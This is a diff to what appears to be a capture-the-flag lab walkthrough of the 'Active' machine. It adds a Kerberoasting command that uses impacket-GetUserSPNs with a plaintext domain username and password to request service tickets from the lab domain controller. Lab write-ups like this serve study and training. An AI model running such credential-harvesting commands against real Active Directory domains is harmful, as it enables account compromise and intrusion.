@@ -202,6 +202,10 @@ impacket-GetNPUsers 'active.htb/' \
 
 No luck here, let's try `Kerberoasting`
 
+```
+sudo impacket-GetUserSPNs -request -dc-ip $T active.htb/SVC_TGS:GPPstillStandingStrong2k18
+```
+
 ![](../../0.%20Assets/Active-1791285992635.webp)
 
 Bingo!
